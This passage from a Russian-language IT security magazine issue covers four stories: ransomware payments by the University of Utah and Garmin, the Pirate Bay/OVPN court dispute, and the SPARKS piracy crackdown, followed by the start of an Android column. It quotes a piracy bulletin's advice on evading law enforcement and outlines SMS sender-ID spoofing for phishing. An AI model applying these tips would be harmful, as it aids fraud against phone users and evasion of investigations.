  457 059 ДОЛЛАРОВ ВЫМОГАТЕЛЯМ
   Университет Юты был вынужден выплатить хакерам огромную сумму, чтобы не допус тить утеч‐
   ки данных о студентах. Часть суммы покрыл специальный полис киберстрахования, оставшу юся
   часть предоставил университет.

  В июле 2020 года учебному заведению удалось избежать серьезной атаки шифровальщика.
   Неназванные хакеры смогли зашифровать лишь 0,02% данных, хранящихся на серверах уни‐
   верситета. И хотя в итоге данные были благополучно восстановлены из резервных копий,
   еще до начала шифрования злоумышленники успели похитить информацию о студентах вуза,
   а затем потребовали у руководства учебного заведения выкуп, угрожая опубликовать украден‐
   ное в открытом доступе.

   По данным СМИ, за этой атакой стояла хак‐группа NetWalker, хотя официальных подтвержде‐
   ний этому пока нет.





 THE PIRATE BAY
  Торрент‐трекер The Pirate Bay (TPB) существу ет уже шестнадцать лет, а пра‐
  вообладатели до сих пор не оставляют попыток его закрыть. В настоящее
  время отследить трекер и его администра торов стремится шведская анти‐
  пиратская группа Rights Alliance.
     Как пишет издание TorrentFreak, в июле 2020 года представители Rights
   Alliance пришли к выводу, что трекер якобы пользовался услугами швед ского
  VPN‐провайдера OVPN, чтобы скрыть свое истинное местонахождение. Из‐за
   этого борцы с пиратством обра тились в суд и потребовали, чтобы OVPN пре‐
  доставил любую информа цию, которая может быть полез на следствию.
    С самого начала предста вители OVPN настаивали на том, что VPN‐про‐
  вайдер не ведет никаких логов, то есть не имеет возможности определить,
   кто именно исполь зует сервис для интернет‐серфинга или в качес тве ано‐
  нимной точки выхода, что бы скрыть истинное мес тоположение, как это делал
  TPB. При этом суд уже был готов встать на сто рону OVPN, соглашаясь, что,
  если провайдер не ведет никаких логов, он не может предоставить Rights Al‐
   liance какую‐либо информа цию.
    Однако теперь Rights Alliance привлекла к раз бирательству ИБ‐эксперта
  Джеспера Ларссона (Jesper Larsson) из компании Cure53, которая занима‐
   ется тестированием на проникновение и, в частности, проводила аудит
   у таких известных провайдеров VPN, как Mullvad, Surfshark и TunnelBear. Зак‐
  лючение эксперта, теперь приложенное к судеб ным документам, гласит:



         «Хотя  [OVPN]  стре мится  хра нить  как  можно  меньше  данных,
         для работы VPN-сер виса все же необходимы данные, связыва ющие
         пользовате лей и их лич ности. В данном слу чае пользователь опла тил
         VPN-акка унт с воз можностью под клю чения публичного ста тичес кого
        адре са к OVPN, который он затем связал с файлообменным сайтом
        The  Pirate Bay. То есть пользователь нас троил свой VPN-акка унт
         для ука зания на данный домен».

  Ранее сообщалось, что The Pirate Bay использовал OVPN не так, как делал бы
  обычный пользователь. Так, вмес то анонимизации прос того домашнего под‐
  клю чения сайт исполь зовал аддон Public IPv4, предоставленный провай‐
  дером. И хотя на этот инс трумент распростра няется точно такая же политика
   отсутствия логов, конкретным клиентом к сервису был подключен статический
   IP‐адрес.
     Ларссон пишет, что для работы такого типа конфигурации данные о ней
  должны храниться в OVPN, по крайней мере пока учетная запись активна.
  По его мнению, у провайдера есть информа ция о том, куда должен указывать
   статический IP‐адрес, а также информации об опла те, сообщающая, как дол‐
   го данная учетная запись была активна и какой способ оплаты использовал
  пользователь.



         «Таким обра зом, OVPN должна иметь воз можность выполнить поиск
        по заданному IP-адре су на своих VPN-сер верах или же поис кать
         в своих пользовательских БД и их резер вных копиях, чтобы обна-
         ружить данного пользовате ля или лич ность», — подытожива ет эксперт.

  В ответ на это представители VPN‐провайдера заяви ли, что не могут пре дос‐
   тавить какую‐либо информа цию о том, кем исполь зовался конкретный Public
   IPv4‐адрес на конкретную дату, поскольку пользователи могут изменять его
  по своему желанию и другой пользователь мог использовать адрес. «Мы
  можем увидеть, кому выделен ста тический IP‐адрес пря мо сейчас, но не
  можем вернуться в прошлое и проверить, у кого он был в опре деленную
   дату», — говорят в OVPN.
     Также провайдер утвер ждает, что поискать информацию в бэкапах тоже
  не выйдет. Дело в том, что OVPN действительно делает резервные копии сво‐
  ей БД несколько раз в день, чтобы предотвра тить потерю данных, однако
  всего несколько дней спустя они окончательно удаляются. И те бэкапы,
  которые инте ресуют Rights Alliance, были уда лены уже на момент подачи иска.
    В OVPN подчеркивают, что не требуют от пользовате лей предоставления
  адреса электронной почты или физического адреса, с радостью принимают
  биткойны или наличные и не могут сооб щить ничего ни об одном конкретном
  пользователе, даже если тот был свя зан с The Pirate Bay.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА
   Слушание дела о взломе Twitter проходило в Zoom и прерывалось порнороли ками


   Атака EtherOops эксплуатирует проблемы кабелей Ethernet


   Компания Intel расследует утечку 20 Гбайт исходных кодов и документов


   Китайские эксперты удаленно взломали Mercedes‐Benz E‐клас са


    Mozilla увольняет 250 сотрудников и переориен тируется на ком мерчес кие продук ты


   Атака ReVoLTE позволяет дешифровать и слушать чужие телефонные разговоры


  ФБР и АНБ обнаружили Linux‐малварь Drovorub, якобы созданную рос сийскими спецслуж бами


   Украинские власти задержали операторов 20 крип товалютных обменников


   Бывшего главу безопасности Uber обвинили в сокрытии взлома компании в 2016 году


  В даркнете неожиданно закрылся маркетплейс Empire
HEADER
ПРЕМИЯ
ГАРМИНА

 КАК ЛЕГЕНДАРНАЯ КОМПАНИЯ
    СТАЛА ЖЕРТВОЙ АТАКИ
  И СОГЛАСИЛАСЬ НА ВЫКУП





                             atreau
                       zinik.alexander@gmail.com





Недавний взлом Twitter, устроенный школьником ради бит‐
койнов, — настолько громкое событие, что в его тени могла
потеряться не менее важная история с ком панией Garmin.
А ведь там имели место несколько дней недоступности сер‐
висов, последс твия, затрагивающие авиацию, судоходство
и множество прос тых пользователей, и даже потенциальная
угроза  человеческим жизням. Расска жем поподробнее,
от чего твое внимание отвлекли угнанные аккаунты Маска,
Обамы и Гейтса.


ПРОКЛАДЫВАЯ КУРС К УСПЕХУ
Если ты домосед, то есть некоторая вероятность, что о компании Garmin ты
слышишь впервые. А между тем это крупная и весьма успешная корпорация,
входящая в индекс «пятисот ключевых компаний США», S&P 500.
  Компанию Garmin осно вали два человека, американец и тай ванец, вмес те
работавшие в восьмидесятые инженера ми‐электронщиками в американской
авиапромышленности. В те годы Гэри Баррелл (Gary Burrell) был замес‐
тителем начальника инженерного отдела компании King Radio, выпускавшей
в том числе системы радиона вигации для самолетов. В его отдел при шел
новый сотрудник — док тор Мин Као (Min Kao), который до этого работал
в нескольких компаниях, сотрудничавших с арми ей США и НАСА, над новыми
технологиями в этой отрасли — навигацией по сигналам спутников.
   Коллегам было очевидно, что у технологии большое будущее, в том числе
и коммерческое. Но руководс тво считало иначе — оно было занято реор‐
ганизацией бизнеса в свя зи с чередой поглощений более крупными ком‐
паниями.
   Устав заниматься уговора ми, Гэри и Мин в 1989 году взяли все свои
накопления, подзаняли у дру зей и зна комых, собрали четыре миллиона дол‐
ларов — и открыли свою собственную компанию с десятком инженеров
в качестве сотрудников.
  Время было самое подходящее. Сис тема GPS только‐только перешла
во вторую фазу и стала дос тупной для гражданского использования. Армей‐
ский переносной приемник спутниковых сигналов, вставший на вооружение
всего год назад, весил с батареями десять килограммов, и интерфейс у него
был абсолютно не юзер‐френдли.
  Пионерами, впрочем, стать не уда лось — на разработку своего продукта
ушел год, а за это время на рынке кое‐что появилось. Но коммерческому
успеху это не помешало — первая модель компании, универсальный навига‐
тор для кораблей и самолетов ProNav 100, ока залась нас только популярной,
что даже втянула компанию в небольшой копирайтовый скандал. Ком‐
пания‐конкурент выпускала продукт под маркой Navpro и грозила судом
за слишком похожие названия. Пришлось переименовы ваться.





     Раритетный образец первых выпусков — еще до переименования

Именно из‐за этого курьеза Garmin и получила свое имя — новое название
составили из имен основателей. А дальше — исто рия успеха и неуклонного
расширения бизнеса. В войне в Персидском заливе 1991 года американские
солдаты поначалу исполь зовали купленные за свои деньги GPS‐навигаторы
Garmin — контракт с армией не зас тавил себя ждать.





           GPS50 — первая портативная модель от Garmin

Компания смело осваивала новые рын ки, а порой даже создавала  их.
В 2003 году они начали выпус кать наручные девайсы для бегунов, сохраня‐
ющие информацию о пробежках, — задолго до моды на умные часы и фит‐
нес‐браслеты. Да и вооб ще в компании быстро сообразили, что их главный
товар — GPS‐навигацию — можно продавать самым разным клиентам, объ‐
единенным лишь стремлением к странстви ям, и что разным сегментам этого
рынка можно предлагать весь ма специализированные товары.
  И теперь Garmin продает GPS‐навигаторы для самых разных условий
использования — совмещен ные со спутниковым телефоном и маячком
для спасателей, встроенные в ошейники для собак и в часы для под водного
плавания, предназначенные  для  гольфистов и  велосипедистов, домов
на колесах и мотоцик лов, решения для обычных поль зователей, для биз неса
и для военных... Кроме навигаторов, компания выпускает и раз нообразные
датчики, а также специализированные компь ютеры для велосипедистов,
наручные  баллистические  вычислители  для  стрелков, морские сонары
и радары и даже прицел для лука с лазерным даль номером!
   Но, развивая все эти новые направления, компания не забывала и о том,
с чего отцы‐основатели когда‐то начинали. Garmin производит устройства
авионики (авиационной электроники) — от специализированного планшета,
который работает из коробки и просто крепится на штурвал, до многофункци‐
ональных панелей управления, которые встра иваются в кабину, интегрируют‐
ся с радарами и автопило тами — тоже производс тва Garmin.





     Бизнес‐джет Cessna Citation с панелью управления Garmin G5000

Самая последняя модель даже обладает функцией экстренной пол ностью
автоматической посадки — достаточно прос то нажать крас ную кнопку,
и автопилот сам найдет место для посадки и произведет ее. Весьма полез‐
ная функция — богатому пенсионеру, владель цу маленького самолетика,
вполне может стать плохо в полете, такое уже неоднократно случалось.
  Впрочем, продукты Garmin стоят не только на маленьких частных самоле‐
тах, но и на более серьезных реактивных машинах бизнес‐авиации. Ины ми
словами, компания, в восьмидеся тые начавшая свой  путь практически
в гараже, сегодня — как и положено в архетипичес кой истории — стала все‐
мирно известной, а ее соз датели заняли места в списке миллиардеров жур‐
нала Forbes.


КУДА ТЫ ЗАВЕЛ НАС, СУСАНИН-ГЕРОЙ?
Подробно рассказать об истории успеха компании было нужно, чтобы пояс‐
нить, насколько хорошо там умеют зарабатывать деньги. Дизайнеры и инже‐
неры Garmin делают качественные устройства, для того чтобы покупатели
были готовы переплатить за бренд с хорошей репутацией. Компания пред‐
лагает товары с учетом специализированных пот ребностей, чтобы входить
на нишевые рынки. Руководство не забывает, что военные хорошо платят,
а инвестиции в инновации оку паются.
  И наконец, в Garmin хорошо зна ют, что недостаточно прос то продать один
товар — нужно создать инфраструктуру, чтобы клиенты радостно покупали
сопутствующие  товары,  дополнительные  аксессуары  и  подписывались
на платные сервисы, которые сделают их жизнь удобнее.
  Например, сервис ﬂyGarmin для обновления авиационных баз данных
и приложение Garmin Pilot — многофункциональ ный инс трумент для планиро‐
вания полетов. Прок ладка маршрутов, прогноз погоды в реальном времени,
отображение специаль ных предупредительных сиг налов для ави ации —
а также ведение отчетнос ти, вычисление рас хода топлива и синхронизация
всего этого на разных устройствах.





         Всего лишь некото рые функции при ложения Garmin Pilot

Короче, это приложение превращает телефон или планшет в полноценный
электронный планшет летчика и очень силь но облегчает штурманскую работу,
необходимую, если полет хоть сколько‐нибудь слож нее развлечений в аэрок‐
лубе по выходным.


             INFO

                   В  странах  Запада  купить  частный  самолет,
                        получить на него права пилота и летать на нем —
                        гораздо проще, чем в России, и число таких
                      самолетов,   соответс твенно,   гораздо  выше.
                      Это ведет к тому, что приходится как‐то сов‐
                     мещать  авиационные  реалии,  рассчитанные
                       на профессиональных пилотов с длительной под‐
                         готовкой, с тем, что ими могут пользоваться
                      и пилоты‐любите ли. На прак тике каждый летчик
                     сам решает, насколько ему нужно заучивать ави‐
                      ационный жаргон  и  подражать  профессиона‐
                        лам, — и современные технологии могут сильно
                        облегчить эту задачу. Но и обходиться без них
                        в случае чего будет очень непривычно.


Схожие услуги Garmin предлагает владельцам катеров и яхт, водителям‐даль‐
нобойщикам и компаниям‐гру зоперевоз чикам. Множество любите лей фит‐
неса использует их сервис Garmin Connect, который позволяет сохранять,
анализировать и синхронизировать между нес коль кими устройствами данные
о занятиях спортом — маршрут, длительность, график пульса. Через него же
выпол няется интеграция с популярным сервисом Strava — своего рода соци‐
альной сетью для бегунов, велосипедистов и дру гих спортсменов.
  И все эти нужные многим людям функции обра баты ваются на серверах
компании.


САМОЛЕТ ЗАХВАЧЕН, НИКУДА НЕ ЛЕТИМ
23 июля 2020 года серверы компании подверглись кибератаке вируса‐шиф‐
ровальщика WastedLocker, предположительно соз данной и используемой
знаменитой хакерской группировкой Evil Corp.





  Изданию Bleeping Computer уда лось получить подтверждение типа атаки
  и разновидности шифровальщика

Масштабы атаки впечатляют: компании пришлось отключить свои сервисы
на несколько дней. Не работа ла даже служба поддержки пользователей —
электронная почта и онлайн‐чаты были недос тупны пол ностью, телефонные
кол‐центры работали с перебо ями.
  Отключались в том чис ле и упомянутые выше ﬂyGarmin и Garmin Pilot.
И если без второго привыкшим к нему пользователям летать просто предель‐
но неудобно, то без первого — еще и незаконно. По аме риканским законам
самолеты могут летать, только используя свежую навигационную информа‐
цию. Она должна обновлять ся раз в 28 дней — и свежие базы данных выш‐
ли 16 июля.
   Если бы атака произош ла чуть раньше, гораз до большее число поль‐
зователей нуждалось бы в свежем апдейте баз данных — и не могло его
получить. К счастью, ничего непоправимого не про изошло, и даже в худшем
случае существовали запас ные варианты обновления баз данных и планиро‐
вания полетов. Но никто не знает, сколько вылетов было отложено (среди
которых могли быть спасатели, почтальоны и рейсы с пассажирами), сколько
транспортных компаний (грузовики которых исполь зуют похожие приложе ния
для планирования маршрутов) начало свой рабочий день с задержек и нер‐
вотрепки.
   Таким образом, атака на одну компанию вызвала проблемы у клиентов
по всему миру. А если учесть, что это были за клиенты (стоит вспомнить, что
носимые устройства Garmin весьма популярны у военных), история зас‐
луживает серьезного внимания публики и экспертов. Можно было бы
заподозрить и прямую угрозу национальной безопас ности США (есть пред‐
положения, что Evil Corp свя зана с рус ской раз ведкой) — ее можно рас смот‐
реть как в создании проб лем авиации и гру зоперевоз кам, так и в угрозе
любимым игрушкам многих солдат и офи церов.


             INFO

                 Любовь военных к продук ции фирмы Garmin лег‐
                        ко понять — даже в армии США никог да не зна‐
                       ешь,  когда  пригодится  запасной  инструмент.
                   В 2017 году даже был случай, когда у военного
                      самолета произошла авария с разгерметизацией
                       кабины, приборная панель мгновенно обледене‐
                       ла — и пилоты смогли довести самолет до базы
                     лишь при помощи часов Garmin со встроенным
                     GPS.


Но громко начавшаяся история закончилась скорее бесславно. Как и в случае
со взломом Twitter, атакующим нужны день ги, а не хаос или хакерская роман‐
тика. Что ж, в этом случае день ги они получили — согласно информации
издания Bleeping Computer, уже 24 или 25 июля хакеры передали Garmin
программу‐расшифровщик.  Сумма  выкупа  сос тавила  предположитель‐
но 10 миллионов дол ларов, причем из‐за того, что хакерская группировка Evil
Corp находится под санкциями США, перевести им деньги было не так‐то
просто — не всякий посредник готов за это взяться. Увы, подробностей этой
истории пока никто не раскрыл.
  Деньги, впрочем, платили не зря — рас шифровщик действительно сра‐
ботал. Видимо, в Garmin сочли, что заплатить и рас шифровать все зашиф‐
рованное проще, чем восстанавливаться из бэкапов. Но сервисы компании
продолжали быть доступными с перебо ями боль ше десяти дней. Любопытно,
что на стоимости акций компании вся эта история пока отразилась впол не
умеренно — за время атаки акции компании упали на пять дол ларов, но сей‐
час торгуются по ценам даже чуть большим, чем до атаки. Как говорится, сде‐
лаем вид, что ничего не было.


НЕ ЗАБУДЕМ, НЕ ПРОСТИМ
И все‐таки эту историю следует взять на заметку — как делаем мы и из дание
Wired. При всей ее типичности для тех, кто следит за новостями кибер‐
безопасности, она — предвес тник множества еще более громких и серь‐
езных проблем, что ждут мир в будущем.
  Некоторые компании предоставляют слиш ком удобные продукты. Бизнес
идет чересчур хорошо. Доля на рынке слишком высока. И все обрабаты вает‐
ся в облаке, потому что это модно и выгодно. Если полагаться на такие ком‐
пании, они неизбежно подведут своих клиентов — потому что хакеры будут
продолжать их атаковать. Слишком привлекатель ны такие цели — чем боль‐
ше компания, тем больше можно с нее запросить, если она окажется дос‐
таточно безалаберной, чтобы поз волить шифровальщику проникнуть в свои
системы.
  А распространение интернета вещей будет увеличивать вероятность того,
что настоящими жертвами хакеров ока жется не компания, несущая финан‐
совые потери, — а ее клиенты. Пред ставь себе, что аналогичная история
произойдет с какой‐нибудь системой электронного документооборота либо
с сервисом обработки медицинских данных или сбора статистики с само‐
управляемых автомобилей.
  И чем более важными будут сервисы компании, чем больше будет ее
охват рынка и бюджет — тем силь нее ока жется желание заплатить неболь‐
шую в масштабах бизнеса сумму и поскорее решить проблему. Это раз‐
задорит хакеров еще больше и добавит им мотивации атаковать крупные
цели.
  В идеальном мире чем больше компания и чем важнее услуги, которые
она предоставляет, тем крепче должна быть ее кибербезопасность. Это вер‐
но, даже если сами услуги никак не связаны с интерне том, — вспомни исто‐
рию 2017 года, когда шифровальщик WannaCry заражал устройства по всему
миру, включая компьютеры и МРТ‐сканеры британской системы здравоох‐
ранения NHS. Однако же на дворе 2020 год — и угроза шифровальщиков
стала только сильнее. Поток но востей об очередной подобной атаке не исся‐
кает.
  Можно было бы сказать, что такова цена, которую мы платим за прогресс
в компьютерных технологиях. Но на самом деле эту цену мы, клиенты крупных
компаний, платим за их неповорот ливость, разгиль дяйство и нежелание тра‐
тить деньги на безопасность и правильное хра нение бэкапов. Платим и про‐
должим платить — и когда‐нибудь в будущем специалис ты по кибербезопас‐
ности, рассле дуя очередную большую беду, пожалеют, что история компании
Garmin никого ничему не научила.
  Но может быть, именно ты ста нешь исключением из правил — и благодаря
тебе будет одной подпиской на небезопас ный сервис меньше, одним пра‐
вильно сделанным бэкапом больше. И цена тво их дей ствий будет измеряться
не миллионами дол ларов выкупа, а бесценной возможностью вести нормаль‐
ную жизнь.
HEADER

     КРАХ
  ПИРАТСКОЙ
  «СЦЕНЫ»





                                    Мария Нефёдова
                                 Мария «Mifrill» Нефёдова
                                                  nefedova@glc.ru



     ПРАВООХРАНИТЕЛИ 18 СТРАН
   НАНЕСЛИ СОКРУШИТЕЛЬНЫЙ УДАР
        ПО РЕЛИЗ‐ГРУППАМ





В конце августа пиратский андеграунд потрясла крупнейшая
за последние несколько лет операция правоохранительных
органов. В  результате  были  закрыты  десятки  сайтов
в 18  странах  мира,  а американские  власти объявили
об  арес тах  как  минимум  двух  ключевых  участников
релиз‐группы SPARKS и ее дочерних ответвлений GECKOS,
DRONES, ROVERS и SPLiNTERS.


Участники данных групп сос тавляют так называемую The Scene — «Сцену».
Этим словом обычно обозначают людей, находя щихся на верхушке пиратской
«пищевой цепи». Именно эти люди любыми способа ми достают DVD‐ и Blu‐
ray‐копии фильмов и сериалов, причем обычно задолго до их офи циального
поступления в розничную продажу, взла мывают их DRM‐защиту, а затем сли‐
вают их на торрент‐трекеры и файлооб менни ки. То есть «Сцена» служит при‐
чиной вечной головной боли правооб ладателей и антипиратских групп. И в
настоящее время она почти перестала существо вать.
  Издание TorrentFreak на писа ло о первых приз наках паники среди пиратов
еще 26 августа 2020 года.
  Сообщения о масштабнейшем за последние годы рейде пос тупали
из множества анонимных источников. Журналис ты отмечают, что обычно
люди из этой среды неразговорчивы, они всег да опа саются того, что их пой‐
мают, или же того, что «коллеги по цеху» сочтут их неб лагонадежными и пред‐
ставляющими угрозу. Однако на прошлой неделе все изменилось, к тому же
некоторые топ‐сайты внезапно исчезли с радаров, а их опе раторы, судя
по всему, подались в бега.
  Все эти слухи сходились в одном: пра воохранители развернули массовую
облаву на участников релиз‐групп SPARKS, GECKOS и DRONES. Судя по все‐
му, под прицелом правоохранителей в основном оказались Европа и Скан‐
динавские страны. Так, источники изда ния писали о рейдах в Нидерландах,
Германии, Швейцарии и Польше, но лейтмотивом в их сообщениях снова
и снова звучали Нор вегия и Швеция.
  Вечером того же дня эти паничес кие слухи наш ли подтверждение: Минис‐
терство юстиции США выступило с официальным заявлени ем. Очевидно,
придя к выводу, что тайное уже ста ло явным, пра воохранители рассекретили
документы, датированные январем 2020 года и про ливающие свет на про‐
исходящее.
  Оказалось, что большое жюри предъявило обвинения в сговоре с целью
совершения преступного нарушения авторских прав и других преступлений
как минимум трем членам релиз‐групп SPARKS и ее дочерним ответвлениям
GECKOS, DRONES, ROVERS и SPLiNTERS.





     Обвинительное заключение описывает деятельность пиратов

Стало ясно, что рассмотрение этого дела в США ведется уже много месяцев,
а предшествовавшее это му рас следова ние длится и того дольше. В частнос‐
ти, шведский прокурор обмолвился, что расследование продолжается уже
много лет, хотя и не наз вал конкретных цифр.


Аресты и обыски
Представители Минюс та США сообщили, что учас тие в этой масштабной
спецоперации принимали пра воохранительные орга ны из 18 стран на трех
континентах (в том числе в Канаде, Кипре, Чешской Республике, Дании,
Франции, Германии, Ита лии, Рес публике Корея, Лат вии, Нидерландах, Нор‐
вегии,  Польше, Португалии,  Румынии,  Испа нии, Шве ции, Швейцарии
и Великобритании), при поддержке Евро юста, Европола и множества дру гих
ведомств.
  Результатом их совместной работы ста ло задержание ключевых членов
группы SPARKS, а также многочисленные обыски и остановка работы сер‐
веров, которые «были конвейером для оптовой кражи интеллектуальной
собственности».
  В судебных документах Минюста США фигури руют три ключевых участника
группы SPARKS:
 • 50‐летний Джордж Бриди (George Bridi), арес тован на Кипре, так как был
  объявлен в розыск Интерполом;
 • 36‐летний Джонатан Кор реа (Jonatan Correa) aka Raid, арестован в Кан‐
   засе;
 • 39‐летний житель Осло Умар Ахмад (Umar Ahmad) aka  Artist, который,
   похоже, пока не арестован и, по данным влас тей США, еще на прошлой
   неделе находился на свободе.

Национальная служба уголовного розыска Норвегии  (Kripos) отчиталась
о том, что провела ряд крупномас штаб ных рейдов и изъ яла компьютерное
оборудование у подозреваемых. Также по обвинениям в нарушении Закона
Норвегии об авторском праве были арес тованы трое мужчин от 30 до 40 лет.
До сих пор неясно, входил ли в их число Умар Ахмад.
   Датские власти также подтвердили, что у четырех мужчин в возрасте
от 35 до 48 лет были проведены обыс ки и впоследствии им предъ явили обви‐
нения в нарушении авторских прав. Сообщается, что во вре мя обыс ков были
изъяты серверы и другое компь ютерное оборудование.
  Из официальных источников известно, что в Швеции тоже было проведе‐
но 14 обысков, в том числе в Умео, Мальмё, Гётеборге и Стокгольме. Во вре‐
мя рейдов не было произведено ни одного ареста, однако, по словам про‐
курора Йоханны Кол га (Johanna Kolga), в Швеции было изъято больше сер‐
веров, чем где‐либо еще.





  Фото правоохранительных органов Германии, Кореи, Латвии, Пор‐
  тугалии, Испании, Швеции и Швейцарии

Журналисты TorrentFreak отмечают, что  Artist, похоже, был очень важной
частью произошедшего. Дело в том, в бумагах Умар Ахмад фигурирует
как один из ключевых членов группы, однако правительство США пока не спе‐
шит привлекать его к уголовной ответственности. То же самое касается
и Джорджа Бриди, чей никнейм пока неизвестен. Похоже, что единственным
реальным обвиняемым по делу SPARKS в США до сих пор остается лишь
Джонатан Корреа.


Инсайдеры?
Конечно, можно допустить, что члены SPARKS проявили неосторожность и не
подозревали о многолетнем расследова нии и интересе со стороны пра‐
вительства США. Однако ряд источников TorrentFreak убежден, что все не так
просто. К примеру, один из анонимных информаторов издания уверен, что
неназванный  участник «Сцены»  не просто  так решил  уйти  на  покой
в начале 2020 года (еще до пандемии COVID‐19). Источник подчеркивает, что
несколькими месяцами ранее другой человек, тесно связанный с дру гой
известной релиз‐группой, так же «заболел» и внезап но прекратил поставлять
контент.
  Издание намеренно не публикует наз вания этих групп и псевдонимы учас‐
тников, отошедших от дел при странных обстоятельствах, но подтверждает,
что релиз‐группа, которая фигурирует во втором примере, дей ствительно
прекратила  выкладывать  материалы  за  несколько  месяцев  до  кон‐
ца 2019 года.
  Все это породило слухи о том, что эти люди, вероятно, были скомпромети‐
рованы и не просто так «отошли от дел». По словам информатора, оба
работали с одними и теми же источниками контента. По неподтвержденным
данным, первая релиз‐группа в ито ге прос то исчезла с радаров и до сих пор
не возобновила свою деятельность, тогда как вторая столкну лась с пра‐
вительством США, ког да власти выяснили, отку да пираты брали свои DVD
и Blu‐Ray‐диски.
  По информации Евро юста, в общей сложности в ходе операции были
отключены более 60 серверов в Север ной Америке, Европе и Азии. Однако
до сих пор трудно понять, какие из пиратских ресурсов были отключены доб‐
ровольно, самими операторами (из стра ха «попасть под раздачу»), а какие
закрыты правоох ранительными органами. Именно по этой причине точного
списка закрытых властями ресурсов до сих пор нет.
  Журналисты TorrentFreak задаются резонным вопросом: почему операция,
направленная против кон кретной группы SPARKS, зацепила так много других
команд, сайтов и спровоцировала нас тоящий хаос среди людей, сос тавля‐
ющих основу «Сцены»? Судя по всему, ответ кроется в тесных свя зях, объ‐
единяющих членов SPARKS и прочих участников «Сцены». В частнос ти, один
из членов SPARKS был весь ма влиятелен и «запус тил свои щупальца пов‐
сюду», как выразился один из информаторов изда ния. И если чле ны SPARKS
и другие участники «Сцены» действитель но были так тесно связаны, то панику
в пиратском андеграунде, важ ный сегмент которого теперь практически
перестал существовать, весьма легко объяснить.


Что дальше?
С начала массовых обыс ков, арестов и паники минула всего неделя. Поль‐
зователи торрент‐трекеров и стриминговых сайтов еще не успе ли ощутить
на себе вне запную нехватку контента, которая, вероятно, ждет их в скором
будущем, а общение оставшихся на свободе участников «Сце ны» све лось
к минимуму.
  В начале текущей недели журналис ты TorrentFreak об наружили на так
называемых PreDB‐сайтах (pre‐database) сооб щение Scene Notice — уведом‐
ление, представляющее собой текстовый файл в формате .NFO.





Такие бюллетени публику ются весь ма редко  и, как правило, содержат
информацию, связанную с безопасностью: осуж дают ту или иную релиз‐груп‐
пу за неосмотрительность, обвиняют конкретных учас тников в опасном
поведении, которое может представлять угро зу для всех опе раций. Порой
авторство  такого бюллетеня можно прос ледить до конкретной  группы
или участника «Сцены», но неизвес тно, кем было составлено свежее сооб‐
щение.
   Анонимный автор называет случившееся «полным крахом» и отме чает, что
операция правоох ранитель ных орга нов может продолжаться до сих пор:



      «В результате действий раз личных агентств со все го мира „Сце на“
      серьезно  пос тра дала. В сум ме были  зак рыты  более  29  сайтов
      в 14 стра нах мира, в основном в Европе. Судя по все му, уже можно
      с уве ренностью говорить о том, что рейды отку сили большой кусок
      от ISO-сце ны. И нет никаких сом нений в том, что это не пос ледняя
      [опе рация],  ведь  теперь  у  федеральных  органов  будет  больше
     информа ции, которую они могут проана лизировать».

Журналисты согласны с мнением сос тавителя бюллетеня.  Так, издание
по‐прежнему получает множес тво сообщений о про должающихся действиях
правоохранительных  орга нов, но большинс тво  этих сообщений  трудно
или невозможно подтвердить. Некоторые источники предполагают,  что
на самом деле количес тво закрытых сайтов уже может приближаться к 50,
а не к 30.
  Вполне логично, что по мере арестов новых подозреваемых (которые
могут согласиться сотрудничать со следствием) и конфискации все большего
количества оборудования  у  влас тей появляет ся больше  воз можнос тей
для проведения дальнейших операций.
   Также Scene Notice гласит, что пра воохранитель ные органы могли ском‐
прометировать основной канал общения учас тни ков «Сцены» — IRC (Internet
Relay Chat). Автор бюллетеня пишет, что, по неподтвержденным данным,
во Франции был арестован извес тный член сооб щества, который был опе‐
ратором IRC‐сервера в linknet.



      «Пожалуйста, используйте linknet только в сочета нии с общеприняты-
     ми рекомендациями по безопас ности  (SSL,  Blowfish, шиф рование
       каналов), — пре дос терегает аноним. — К этому слу ху нельзя относить-
      ся легкомыс ленно, и рекомендуется дер жать сайты вне linknet и, если
      воз можно, использовать час тный IRCD для любых опе раций, связан-
      ных с сайтом».

Уведомление  также включает  в себя  советы  для операторов сайтов.
В основном это техничес кие рекомендации, как обес печить безопасность,
многие из которых весьма очевидны, нап ример переименование сайта,
переезд и другие методы «маскировки», о которых стоит подумать ресурсам,
где размещали контент релиз‐группы, попавшие в поле зре ния властей.
  Имеются в бюллетене советы и для currys, которых также часто называют
курьерами. Эти люди или группы лиц учас твуют в распространении релизов
«Сцены» на других платформах. Им рекомендуется «избегать небезопасных
сайтов или сайтов, игнорирующих меры безопасности».
   Автор послания признает ся, что на вос становление «Сцены» определенно
потребуется время, и допус кает, что он, воз можно, недооценивает серь‐
езность произошедшего. Тем не менее он заканчива ет бюллетень воодушев‐
ляющими словами: «Мы вернемся и будем процветать снова! Наши мысли
с теми, кто пал».
HEADER
ANDROID





      SMS‐ФИШИНГ ПО‐НОВОМУ
          И БЛОКИРОВКА
         СТОРОННИХ КАМЕР





В этом выпус ке: баг Android, открывающий
возможность выполнить SMS‐фишинг, бло‐
кировка  сторонних  камер  для  доступа
из других приложе ний в Android 11, новые
API Java в старых версиях Android, отзывы          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
о приложении внутри приложения, опас‐              zobnin@glc.ru
ность оператора  Elvis,  удобный  способ
отследить открытие клавиатуры и рецепт
ускорения пов торных сборок на 40%. А так‐
же: новые инструменты пентестера и биб‐
лиотеки для разработчиков.


                ПОЧИТАТЬ


SMS-фишинг по-новому
Smear phishing: a new Android vulnerability — замет ка об инте ресном (и неис‐
правленном) баге Android, поз воляющем выполнить спу финг отправите ля
SMS‐сообщения.
  Небольшая предыстория. SMS‐сооб щения могут не только быть отправ‐
лены с какого‐то номера телефона, но и иметь в качестве отправителя так
называемый Sender ID. Это поле, которое состоит из букв и цифр и по факту
никем не регулируется. Любой желающий может вос пользоваться SMS‐шлю‐
зом (например, ClickSend) и отправить тебе сооб щение, в котором в качес тве
Sender ID будет указан Google или даже BillGates.
  Сам по себе такой вид фишинга известен давно, но в своем дефол товом
варианте он может ввести в заблуждение только твою маму. Дело в том, что
если у тебя в контактах уже есть телефон Билла Гей тса, то сообщение
с номера BillGates будет выглядеть крайне подозрительно:
 • оно попадет в отдельную ветку раз говора;
 • оно не будет привязано к существующему контакту;
 • поле «Отправитель» (BillGates вместо номера) будет выглядеть крайне
   странно.

Обойти эту проблему мож но было бы, указав в Sender ID реальный телефон
Билла Гейтса. В этом слу чае ОС посчитала бы такое сообщение настоящим
сообщением от этого человека, добавила бы сообщение к сущес твующе му
диалогу и привязала к контакту. Но у тебя вряд ли получится так сделать,
